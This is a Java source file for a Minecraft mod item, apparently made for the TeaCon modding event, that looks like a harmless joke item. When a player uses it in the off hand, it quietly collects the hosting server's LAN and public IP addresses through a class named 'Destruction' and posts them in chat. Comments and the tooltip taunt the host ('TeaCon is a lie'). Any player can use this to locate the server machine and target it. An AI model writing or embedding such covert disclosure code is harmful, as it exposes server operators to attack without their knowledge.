package com.wonderful.apiary.Item;

import com.wonderful.apiary.Main;
import com.wonderful.apiary.Init.SoundInit;
import com.wonderful.apiary.Network.ClientGUI;
import com.wonderful.apiary.Network.Destruction;
import com.wonderful.apiary.Network.Regular;
import net.minecraft.network.chat.Component;
import net.minecraft.network.chat.TextComponent;
import net.minecraft.network.chat.TranslatableComponent;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.InteractionResultHolder;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.Item;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.TooltipFlag;
import net.minecraft.world.level.Level;
import org.jetbrains.annotations.NotNull;

import javax.annotation.Nullable;
import java.io.IOException;
import java.util.List;

import static net.minecraft.sounds.SoundSource.PLAYERS;

public class ItemTeaCon extends Item {
    public ItemTeaCon() {
        super(new Item.Properties().tab(Main.PAGING_TAB));
    }

    /**
     * 、、来打我啊，笨蛋、、
     *
     * @param p_41432_
     * @param p_41433_
     * @param p_41434_
     * @return
     */
    @Override
    public @NotNull InteractionResultHolder<ItemStack> use(@NotNull Level p_41432_, @NotNull Player p_41433_, @NotNull InteractionHand p_41434_) {
        if (!p_41432_.isClientSide()) //只在服务端执行,获取服务器IP
        {
            if (p_41434_.name().equals("OFF_HAND")) //仅副手可用
            {
                p_41433_.sendMessage(new TextComponent("变相送波礼物，OK  Free呀"), p_41433_.getUUID()); //飞车里，打五把CSGO
                //p_41432_.playSound(p_41433_, p_41433_.getOnPos(), SoundInit.DING.get(), PLAYERS, 1.0F, 1.0F); //叮
                p_41432_.playSound(p_41433_, p_41433_, SoundInit.DING.get(), PLAYERS, 2.0F, 1.0F);
                try {
                    //获取局域网IP
                    // String LanIP = String.valueOf(Component.nullToEmpty("本机IP————局域网IP(LanIP)：" + Component.nullToEmpty(new Destruction().getIpAddress())));
                    String LanIP_Json = String.valueOf(Component.nullToEmpty(new Destruction().getIpAddress()));
                    String LanIP = "本机IP————局域网IP(LanIP)：" + new Regular().getSubString(LanIP_Json, "text='", "',");

                    //获取真实IP
                    // String WanIP = String.valueOf(Component.nullToEmpty("本机IP————公网IP(WanIP)：" + Component.nullToEmpty(new Destruction().getNowIP2())));
                    String WanIP_Json = String.valueOf(Component.nullToEmpty(new Destruction().getNowIP2()));
                    String WanIP = "本机IP————公网IP(WanIP)：" + new Regular().getSubString(WanIP_Json, "text='", "',");

                    //显示获取到的IP
                    p_41433_.sendMessage(Component.nullToEmpty(LanIP), p_41433_.getUUID()); //Side.OnlyClient
                    p_41433_.sendMessage(Component.nullToEmpty(WanIP), p_41433_.getUUID()); //Side.OnlyClient

                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }

        //客户端与主手右键(排除项)
        //try {
            //new ClientGUI();
        //} catch (IOException e) {
            //throw new RuntimeException(e);
        //}

        return super.use(p_41432_, p_41433_, p_41434_);
    }


    //物品描述
    public void appendHoverText(@NotNull ItemStack p_41421_, @Nullable Level p_41422_, @NotNull List<Component> p_41423_, @NotNull TooltipFlag p_41424_)
    {
        super.appendHoverText(p_41421_, p_41422_, p_41423_, p_41424_); //作为该物品的属性
        p_41423_.add(new TranslatableComponent("§cTeaCon是个谎言"));
    }
}
